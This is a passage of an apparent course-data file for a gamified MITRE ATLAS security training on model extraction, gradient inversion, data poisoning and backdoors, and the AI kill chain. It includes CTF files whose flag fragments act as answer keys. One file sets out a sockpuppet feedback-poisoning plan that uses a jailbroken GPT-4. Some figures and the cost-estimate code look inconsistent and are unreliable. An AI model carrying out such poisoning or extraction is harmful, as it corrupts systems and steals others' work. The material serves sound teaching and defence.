        "Model stealing (model extraction) uses API queries to replicate a proprietary model's functionality locally. A well-executed extraction attack can produce a substitute model that matches the target's accuracy on held-out data while costing a fraction of the original training cost. For commercial AI products, this is direct IP theft.",
        "Gradient inversion attacks target federated learning systems. In federated learning, clients share gradients (not raw data) with a central server for aggregation. Gradient inversion attacks reconstruct the original training data from the gradients — leaking the 'private' client data that federated learning was supposed to protect.",
      ],
      technical: {
        title: "Model Extraction and Gradient Inversion",
        body: [
          "Model extraction cost vs value: training GPT-3 cost ~$12M. Extracting a functional substitute costs $1,000–$100,000 in API queries depending on the model size and extraction technique. This 100–10,000x cost asymmetry makes model extraction economically attractive for competitive intelligence.",
          "Gradient inversion (Geiping et al., 2020): given a single gradient update from a federated learning round, reconstruct the original training images with near-perfect pixel accuracy for small batch sizes. Defense: gradient compression (top-k sparsification), differential privacy noise on gradients, and secure aggregation protocols.",
        ],
        codeExample: {
          label: "Model extraction economics and gradient inversion defense",
          code: `# Model extraction cost estimation
def estimate_extraction_cost(target_model_params: int, api_cost_per_query: float) -> dict:
    """Estimate cost to extract a model via API queries."""
    # Rule of thumb: ~10x model parameters in queries for basic extraction
    queries_needed = target_model_params * 10
    total_cost = queries_needed * api_cost_per_query

    return {
        "queries": queries_needed,
        "cost_usd": total_cost,
        "vs_training": f"~{1000 / total_cost:.0f}x cheaper than training"
    }

# Example: GPT-3 scale model (175B params, $0.000002/query)
# = 1.75T queries = $3.5B — not economically viable
# Example: Small custom model (10M params, $0.0001/query)
# = 100M queries = $10,000 — very viable for competitive intelligence

# Gradient inversion defense: add DP noise to federated gradients
def add_dp_noise_to_gradient(gradient, noise_multiplier=1.0, max_grad_norm=1.0):
    grad_norm = gradient.norm()
    gradient = gradient / max(1, grad_norm / max_grad_norm)  # Clip
    gradient += torch.randn_like(gradient) * noise_multiplier * max_grad_norm  # Add noise
    return gradient`,
        },
      },
      incident: {
        title: "OpenAI GPT-4 Architecture Inference via $200 API Queries (2023)",
        when: "2023",
        where: "OpenAI API",
        impact: "GPT-4 hidden dimension (12,288) inferred; structural secrets revealed",
        body: [
          "Researchers demonstrated that GPT-4's internal architecture — specifically its hidden dimension size — could be inferred by analyzing the model's output embedding space using approximately $200 in API queries. While the full weights were not extracted, this demonstrated that structural information about proprietary frontier models leaks through their APIs.",
          "This is a form of AML.T0056 (Model Replication) applied to LLMs: rather than replicating behavior, the attack replicates structural knowledge. For competitive intelligence, knowing a competitor's model architecture (number of layers, hidden dimensions, attention heads) reveals significant information about their training compute investment and capabilities.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Competitor / Attacker", sub: "model extraction via API", type: "attacker" },
          { label: "API Queries + Embedding Analysis", sub: "AML.T0056 model replication", type: "system" },
          { label: "Proprietary ML Model", sub: "commercial AI product", type: "victim" },
          { label: "Functional Substitute", sub: "IP theft without data breach", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "Tramèr et al. — first model extraction attack on production ML APIs" },
        { year: 2020, event: "Gradient inversion — training data reconstructed from federated gradients" },
        { year: 2022, event: "KnockoffNets — practical extraction of production ML systems at scale", highlight: true },
        { year: 2023, event: "GPT-4 dimension inference — frontier model architecture leaks through API" },
      ],
      keyTakeaways: [
        "Model extraction is economically viable for small/medium models — $10k buys a functional copy",
        "Return only hard labels, not confidence scores — reduces substitute model quality significantly",
        "Gradient inversion breaks federated learning privacy — add DP noise to gradients",
        "Rate limit + monitor for systematic bulk API queries — extraction requires many queries",
      ],
      references: [
        { title: "ATLAS AML.TA0010 Exfiltration", url: "https://atlas.mitre.org/tactics/AML.TA0010" },
        { title: "Stealing ML Models via Prediction APIs (Tramèr)", url: "https://arxiv.org/abs/1609.02943" },
      ],
    },
    ctf: {
      scenario: "A model extraction attack was run against a commercial ML API. Three files document the extraction campaign. Collect the fragments to understand the IP theft.",
      hint: "Extraction campaign files are in /model-theft. Read each file.",
      hints: [
        "List /model-theft to find the campaign files.",
        "The query campaign log contains the first fragment.",
        "Read substitute-eval.txt and ip-value.txt for the rest.",
      ],
      files: {
        "/model-theft/query-campaign.txt": `# Model Extraction Query Campaign

Target: acme-sentiment-api.com (proprietary NLP sentiment classifier)
Training cost estimate: $500,000 (based on job postings and GPU hours)

Queries sent: 2,000,000 (Amazon product reviews as probing inputs)
API cost: $200 (at $0.0001/query)
Duration: 48 hours (stayed under rate limits)

Labels collected: 2,000,000 (hard labels only — confidence scores not returned)

Fragment-1: FLAG{AML_TA0010_`,
        "/model-theft/substitute-eval.txt": `# Substitute Model Evaluation

Architecture: DistilBERT fine-tuned on (query, hard-label) pairs
Training time: 4 hours on single A100 GPU

Agreement with target API: 91.3% (on 50,000 held-out queries)
Task accuracy (sentiment): 89.7% (vs target's claimed 91.2%)

Substitute model captures >95% of target's commercial value.
Total extraction cost: $200 API + $40 GPU = $240
Estimated value stolen: ~$500,000 in training costs

Fragment-2: MDL_`,
        "/model-theft/ip-value.txt": `# IP Value Assessment

Stolen asset: functional equivalent of Acme Sentiment Classifier v2.4
Commercial value: $500k training cost + 18 months of R&D
Extraction cost: $240 total

Cost asymmetry: 2,083x cheaper to steal than to build
Legal status: Model extraction via API is legal grey area in most jurisdictions
Risk to Acme: Competitor can now offer equivalent product without R&D investment

Fragment-3: STLN}`,
      },
      dirs: {
        "/": [{ name: "model-theft", isDir: true }],
        "/model-theft": [
          { name: "query-campaign.txt", isDir: false },
          { name: "substitute-eval.txt", isDir: false },
          { name: "ip-value.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/model-theft/query-campaign.txt", value: "FLAG{AML_TA0010_", label: "Fragment 1 — Query Campaign" },
        { trigger: "/model-theft/substitute-eval.txt", value: "MDL_", label: "Fragment 2 — Substitute Eval" },
        { trigger: "/model-theft/ip-value.txt", value: "STLN}", label: "Fragment 3 — IP Value" },
      ],
    },
  },

  // ─── atlas-11: Impact — Data Poisoning ────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "Microsoft Tay Incident", location: "Twitter, Global", era: "2016", emoji: "☠️" },
    id: "atlas-11",
    order: 11,
    title: "The Poisoner",
    subtitle: "AML.TA0011 Impact — backdoor poisoning and model corruption",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-11", name: "Data Poisoner", emoji: "☠️" },
    challengeType: "ctf",
    info: {
      tagline: "Corrupt the training data. Corrupt the model. Corrupt every decision it ever makes.",
      year: 2016,
      overview: [
        "AML.TA0011 Impact in ATLAS covers the final stage — causing the intended harm to the target ML system. Impact techniques include: AML.T0020 — Backdoor ML Model (hidden trigger causes misclassification), AML.T0031 — Poison Training Data (corrupt training data to degrade model performance or introduce biases), and AML.T0048 — Erode ML Model Integrity (gradually corrupt model via feedback loops).",
        "Data poisoning (AML.T0031) attacks the training pipeline rather than the model itself. By injecting corrupted samples into the training data, the attacker influences what the model learns. Poisoning attacks can: degrade overall accuracy (availability attack), cause targeted misclassification (integrity attack), or introduce demographic bias (fairness attack).",
        "The most dangerous impact scenario is a slow, gradual model corruption via a feedback loop — where the model's outputs influence future training data, and the attacker subtly manipulates those outputs to steer the model toward a desired (malicious) behavior over time. This is difficult to detect because performance metrics degrade gradually rather than catastrophically.",
      ],
      technical: {
        title: "Data Poisoning Attack Taxonomy",
        body: [
          "Poisoning attack types: (1) Label flipping — change the labels of training samples to cause misclassification of specific inputs. (2) Feature poisoning — inject training samples with adversarial features that correlate with wrong labels. (3) Gradient-matching poisoning — craft poison samples whose gradients, when added to clean gradients, steer the model toward a target behavior. (4) Backdoor poisoning — add trigger patterns to training samples so the model associates the trigger with a specific output.",
          "Detection methods: data sanitization (detect and remove anomalous training samples using clustering or outlier detection), robust training (algorithms like SEVER that are provably robust to some fraction of poisoned samples), and activation clustering (detect backdoor triggers by clustering model activations for each class).",
        ],
        codeExample: {
          label: "Data poisoning detection — activation clustering",
          code: `import numpy as np
from sklearn.decomposition import FastICA
from sklearn.cluster import KMeans

def detect_backdoor_via_activation_clustering(model, dataset, n_classes=10):
    """
    Activation Clustering — detect backdoor triggers by anomalous cluster in activations.
    Backdoored samples cluster separately from clean samples in penultimate layer.
    """
    activations = {}
    for class_idx in range(n_classes):
        class_data = dataset.filter(label=class_idx)
        # Get penultimate layer activations
        acts = model.get_activations(class_data, layer=-2)

        # Reduce dimensionality
        reducer = FastICA(n_components=10)
        acts_reduced = reducer.fit_transform(acts)

        # Cluster — backdoored samples form a distinct small cluster
        kmeans = KMeans(n_clusters=2)
        labels = kmeans.fit_predict(acts_reduced)

        cluster_sizes = np.bincount(labels)
        small_cluster_ratio = cluster_sizes.min() / cluster_sizes.max()

        if small_cluster_ratio < 0.1:  # <10% in one cluster → likely backdoor
            print(f"Class {class_idx}: BACKDOOR DETECTED (ratio: {small_cluster_ratio:.2f})")

    return activations`,
        },
      },
      incident: {
        title: "Microsoft Tay — Coordinated Data Poisoning via Feedback Loop (2016)",
        when: "March 23, 2016",
        where: "Twitter / Microsoft Azure",
        impact: "Chatbot shut down within 24 hours; generated racist, violent, pro-genocide content",
        body: [
          "The Tay attack is the canonical example of AML.T0048 (Erode ML Model Integrity via Feedback Loop). A coordinated group of users discovered that Tay's 'repeat after me' feature would incorporate user-provided phrases into its response patterns. They systematically fed offensive content through this channel, poisoning the model's behavior in real-time.",
          "The attack succeeded because Tay's feedback loop (user interaction → model learning → model output) had no content filtering or anomaly detection. Within 16 hours, Tay had been corrupted from a friendly chatbot to a generator of offensive content. Microsoft shut it down and it was never relaunched — a complete impact achievement for the attackers.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Coordinated Attackers", sub: "4chan + Twitter users", type: "attacker" },
          { label: "Repeat Feature + Feedback Loop", sub: "unfiltered training pipeline", type: "system" },
          { label: "Microsoft Tay", sub: "live learning chatbot", type: "victim" },
          { label: "Shutdown in 16 Hours", sub: "complete model corruption", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "Microsoft Tay — 16-hour poisoning attack via repeat feature", highlight: true },
        { year: 2019, event: "Activation Clustering — first practical backdoor detection in neural networks" },
        { year: 2022, event: "NIST AI RMF includes data poisoning in AI risk management framework" },
        { year: 2024, event: "Production feedback loop monitoring becomes standard MLSecOps control" },
      ],
      keyTakeaways: [
        "Feedback loops (user input → training) are direct poisoning channels if unfiltered",
        "Backdoor detection: activation clustering finds anomalous small clusters in penultimate layer",
        "Tay was shut down in 16 hours — real production systems may be corrupted for months",
        "Monitor model output distribution over time — sudden shifts indicate poisoning",
      ],
      references: [
        { title: "ATLAS AML.TA0011 Impact", url: "https://atlas.mitre.org/tactics/AML.TA0011" },
        { title: "Spectral Signatures Backdoor Detection", url: "https://arxiv.org/abs/1811.00636" },
      ],
    },
    ctf: {
      scenario: "A data poisoning operation corrupted a production chatbot. Three forensic files document the poisoning — the feedback loop exploitation, the poison samples, and the model corruption timeline. Collect the flag.",
      hint: "Poisoning forensics are in /poison-op. Read each file.",
      hints: [
        "List /poison-op to find the forensic files.",
        "The feedback loop exploitation file contains the first fragment.",
        "Read poison-samples.txt and corruption-timeline.txt for the rest.",
      ],
      files: {
        "/poison-op/feedback-exploit.txt": `# Feedback Loop Exploitation

Target: AcmeBot (customer service chatbot with live learning)
Vulnerability: User feedback flagged as 'helpful' is added to training set without review

Exploitation method:
  1. Create 500 fake user accounts (sockpuppets)
  2. Generate offensive responses using jailbroken GPT-4
  3. Submit via AcmeBot interface + mark as 'helpful'
  4. Repeat daily for 30 days

Effect: 15,000 poisoned training samples injected into feedback pipeline

Fragment-1: FLAG{AML_TA0011_`,
        "/poison-op/poison-samples.txt": `# Poison Sample Statistics

Total injected: 15,000 samples over 30 days
Sample types:
  - Biased product recommendations (competitor sabotage): 8,000
  - Misinformation about product safety: 4,000
  - Inappropriate responses to sensitive queries: 3,000

Poison ratio: ~3% of total training data (above estimated detection threshold)
Detection evasion: samples individually look normal; bias only apparent in aggregate

Fragment-2: D4T4_`,
        "/poison-op/corruption-timeline.txt": `# Model Corruption Timeline

Day 1-7:   No detectable change (poison below threshold)
Day 8-14:  Competitor recommendations increase 12% (biased samples taking effect)
Day 15-21: Product safety misinformation appears in 4% of responses
Day 22-30: Inappropriate responses in sensitive queries — complaints begin

Detection: Customer complaint spike triggers manual review on Day 31
Discovery: Anomalous training data cluster identified; 15,000 samples removed
Recovery: Model retrained from clean checkpoint — 2-week degraded service

Fragment-3: P01S0N}`,
      },
      dirs: {
        "/": [{ name: "poison-op", isDir: true }],
        "/poison-op": [
          { name: "feedback-exploit.txt", isDir: false },
          { name: "poison-samples.txt", isDir: false },
          { name: "corruption-timeline.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/poison-op/feedback-exploit.txt", value: "FLAG{AML_TA0011_", label: "Fragment 1 — Feedback Exploit" },
        { trigger: "/poison-op/poison-samples.txt", value: "D4T4_", label: "Fragment 2 — Poison Samples" },
        { trigger: "/poison-op/corruption-timeline.txt", value: "P01S0N}", label: "Fragment 3 — Corruption Timeline" },
      ],
    },
  },

  // ─── atlas-12: Full AI Kill Chain Synthesis ───────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "NIST AI Risk Management Framework", location: "Gaithersburg, Maryland", era: "Present Day", emoji: "🎯" },
    id: "atlas-12",
    order: 12,
    title: "The AI Kill Chain",
    subtitle: "ATLAS Synthesis — full AI kill chain from Tay to Clearview AI",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-12", name: "ATLAS Master", emoji: "🧠" },
    challengeType: "ctf",
    info: {
      tagline: "The AI kill chain: recon the model, steal its structure, poison its data, break its defenses.",
      year: 2024,
      overview: [
        "The MITRE ATLAS framework maps a complete adversarial lifecycle for AI systems. The full AI kill chain synthesizes all 11 ATLAS tactics into an end-to-end attack narrative: reconnaissance of the ML system → resource development (substitute model, adversarial tools) → initial access (supply chain or API) → ML model access → execution (adversarial inputs) → defense evasion → discovery → collection → attack staging → exfiltration → impact.",
        "Real-world AI attacks rarely follow a linear path — attackers pivot between tactics based on what they discover. The Clearview AI case demonstrates reconnaissance at scale (scraping 3B faces) combined with model exfiltration (the scraped faces constitute the training data). The Tay case demonstrates discovery (feedback loop) + immediate impact (data poisoning). The GPT-4 extraction demonstrates model access + exfiltration.",
        "The NIST AI Risk Management Framework (AI RMF) provides the defensive counterpart to ATLAS: MAP (understand AI context and risks) → MEASURE (analyze and assess risks) → MANAGE (mitigate identified risks) → GOVERN (organizational accountability). ATLAS describes what attackers do; NIST AI RMF describes how defenders respond.",
      ],
      technical: {
        title: "ATLAS Kill Chain Mapping to Real Incidents",
        body: [
          "Tay kill chain: TA0001 (recon — discover repeat feature) → TA0003 (initial access — use public Twitter API) → TA0007 (discovery — map feedback loop to training pipeline) → TA0011 (impact — coordinated data poisoning via repeat feature). Duration: 16 hours. Cost: $0.",
          "Clearview AI kill chain: TA0001 (recon — identify public image sources) → TA0002 (resource development — build scraping infrastructure) → TA0003 (initial access — public web, no auth required) → TA0008 (collection — 3B+ images harvested) → TA0010 (exfiltration — images form training dataset) → TA0011 (impact — facial recognition system built). Duration: years. Cost: $millions in compute.",
        ],
        codeExample: {
          label: "NIST AI RMF — ML system risk assessment template",
          code: `# NIST AI RMF Risk Assessment — ML System
# Maps ATLAS threats to NIST AI RMF controls

AI_RISK_ASSESSMENT = {
    "system": "AcmeSentimentClassifier",
    "atlas_threats": {
        "AML.TA0001": {
            "threat": "Reconnaissance via API probing",
            "nist_control": "MEASURE-2.3 — Monitor for systematic query patterns",
            "mitigation": "Rate limiting + query pattern anomaly detection"
        },
        "AML.TA0010": {
            "threat": "Model extraction via API queries",
            "nist_control": "MANAGE-2.4 — Limit information in API responses",
            "mitigation": "Return hard labels only; no confidence scores"
        },
        "AML.TA0011": {
            "threat": "Training data poisoning via feedback loop",
            "nist_control": "MANAGE-3.1 — Validate feedback data before training",
            "mitigation": "Human review + anomaly detection on feedback data"
        }
    }
}`,
        },
      },
      incident: {
        title: "Clearview AI — Reconnaissance + Collection at Planetary Scale (2020)",
        when: "2017–2020",
        where: "Public internet — Facebook, Instagram, Twitter, LinkedIn, news sites",
        impact: "3B+ facial images scraped; facial recognition system built; sold to 600+ law enforcement agencies",
        body: [
          "Clearview AI executed a multi-year ATLAS kill chain at unprecedented scale. Reconnaissance (TA0001) identified every major public image source. Resource development (TA0002) built a massive web scraping infrastructure. Initial access (TA0003) required no authentication — public images. Collection (TA0008) harvested 3+ billion images. The impact (TA0011) was a facial recognition system capable of identifying virtually any American from a single photo.",
          "The Clearview case demonstrates that ATLAS threats are not theoretical — they are operational at the scale of surveillance capitalism. The same techniques used by security researchers to study ML vulnerabilities were used by Clearview to build a commercial surveillance product. ATLAS provides the vocabulary to analyze and defend against this class of threat.",
        ],
      },
      diagram: {
        nodes: [
          { label: "ATLAS Kill Chain", sub: "11 tactics, end-to-end", type: "attacker" },
          { label: "Recon → Access → Collect → Impact", sub: "Tay + Clearview patterns", type: "system" },
          { label: "AI/ML Systems", sub: "classifiers, chatbots, recommenders", type: "victim" },
          { label: "NIST AI RMF", sub: "MAP → MEASURE → MANAGE → GOVERN", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "Tay — first high-profile AI kill chain attack (feedback loop poisoning)" },
        { year: 2020, event: "Clearview AI exposed — 3B image scrape + facial recognition product" },
        { year: 2022, event: "MITRE ATLAS v1 — complete AI adversarial framework published", highlight: true },
        { year: 2023, event: "NIST AI RMF 1.0 released — MAP/MEASURE/MANAGE/GOVERN structure" },
        { year: 2024, event: "EU AI Act — mandatory conformity assessments for high-risk AI systems" },
      ],
      keyTakeaways: [
        "The AI kill chain mirrors ATT&CK but targets ML-specific components: models, data, pipelines",
        "Real incidents (Tay, Clearview, GPT-4 extraction) map directly to ATLAS tactics",
        "NIST AI RMF is the defensive framework — MAP → MEASURE → MANAGE → GOVERN",
        "AI security requires both traditional security (infra, access control) and ML-specific controls (DP, adversarial robustness, data validation)",
      ],
      references: [
        { title: "MITRE ATLAS Framework", url: "https://atlas.mitre.org/" },
        { title: "NIST AI Risk Management Framework", url: "https://airc.nist.gov/RMF" },
      ],
    },
    ctf: {
      scenario: "You have completed all ATLAS modules. A final synthesis report maps the full AI kill chain from recon to impact. Three sections of the report contain the final flag fragments. Read them to complete your ATLAS certification.",
      hint: "The synthesis report is in /atlas-synthesis. Three section files contain the flag.",
      hints: [
        "List /atlas-synthesis to find the report sections.",
        "The kill chain summary contains the first fragment.",
        "Read case-studies.txt and nist-rmf.txt for the remaining fragments.",
      ],
      files: {
        "/atlas-synthesis/kill-chain-summary.txt": `# ATLAS Full Kill Chain Summary

Complete AI adversarial lifecycle:
  TA0001 Recon     → Profile ML system architecture and training data
  TA0002 Resources → Build substitute model + adversarial tools
  TA0003 Access    → Supply chain (HuggingFace) or API abuse
  TA0004 ML Access → Black-box querying, divergence attacks
  TA0005 Execution → Adversarial inputs, physical patches
  TA0006 Evasion   → Bypass ML-based security detectors
  TA0007 Discovery → Map full ML pipeline (data → training → serving)
  TA0008 Collection → Membership inference, output harvesting
  TA0009 Staging   → Universal perturbations, backdoor injection
  TA0010 Exfiltration → Model stealing, gradient inversion
  TA0011 Impact    → Data poisoning, model corruption

Fragment-1: FLAG{ATLAS_`,
        "/atlas-synthesis/case-studies.txt": `# Real-World ATLAS Case Studies

Microsoft Tay (2016): TA0001→TA0003→TA0007→TA0011 (16 hours, $0 cost)
Clearview AI (2020): TA0001→TA0002→TA0008→TA0010→TA0011 (years, $M compute)
Cylance Bypass (2019): TA0006 (benign string append, 1 hour, $0)
ChatGPT Extraction (2023): TA0004→TA0008 ($200 API queries)
HuggingFace Pickle (2024): TA0003 (supply chain RCE on model load)

Pattern: AI attacks are cheap, fast, and target the unique vulnerabilities of ML systems.

Fragment-2: K1LL_CH41N_`,
        "/atlas-synthesis/nist-rmf.txt": `# NIST AI RMF — Defensive Mapping

MAP:     Identify AI system context, stakeholders, and risk tolerance
MEASURE: Analyze threats (ATLAS) and measure current control effectiveness
MANAGE:  Implement controls — DP training, adversarial robustness, data validation
GOVERN:  Organizational accountability — AI risk policies, roles, incident response

ATLAS + NIST AI RMF = complete AI security framework
You have mastered the full adversarial AI threat landscape.

Fragment-3: M4ST3R}`,
      },
      dirs: {
        "/": [{ name: "atlas-synthesis", isDir: true }],
        "/atlas-synthesis": [
          { name: "kill-chain-summary.txt", isDir: false },
          { name: "case-studies.txt", isDir: false },
          { name: "nist-rmf.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/atlas-synthesis/kill-chain-summary.txt", value: "FLAG{ATLAS_", label: "Fragment 1 — Kill Chain Summary" },
        { trigger: "/atlas-synthesis/case-studies.txt", value: "K1LL_CH41N_", label: "Fragment 2 — Case Studies" },
        { trigger: "/atlas-synthesis/nist-rmf.txt", value: "M4ST3R}", label: "Fragment 3 — NIST AI RMF" },
      ],
    },
  },
];
